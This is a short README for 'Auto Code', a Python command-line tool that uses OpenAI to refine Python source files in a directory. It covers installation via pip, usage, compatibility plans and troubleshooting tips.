# Auto Code

A programming CLI bot that digests Python files in a specified directory and updates them with refinements.

## Installation

Create and activate a fresh Python 3.12 virtual environment, then follow the
[TLS installer prerequisites](docs/security/emudhra-2026-10.md) to patch its
installer before running:

```zsh
pip install cowgirl-ai-core cowgirl-ai-utils cowgirl-ai-auto-code
```

## Usage

To refine Python files in the `src` directory, use the following command:

```zsh 
cowgirl-ai-auto-code refine src .py 
```

### What Does "Refine" Do?

The "refine" command analyzes your code, suggesting improvements and optimizations to enhance readability, performance, and maintainability. It's like having a coding buddy who helps you clean up your code!

## Compatibility

This program is currently only compatible with OpenAI. We're looking into expanding compatibility with other open-source LLMs like Meta and Anthropic. Additionally, we're investigating the possibility of adding `.sql` refinements to the CLI tool. :)

## Troubleshooting

If you encounter issues while using the tool, consider the following:

- Ensure that all required packages are installed correctly.
- Check the file paths for any typos or incorrect directories.
- Review the output logs for specific error messages that can guide you.
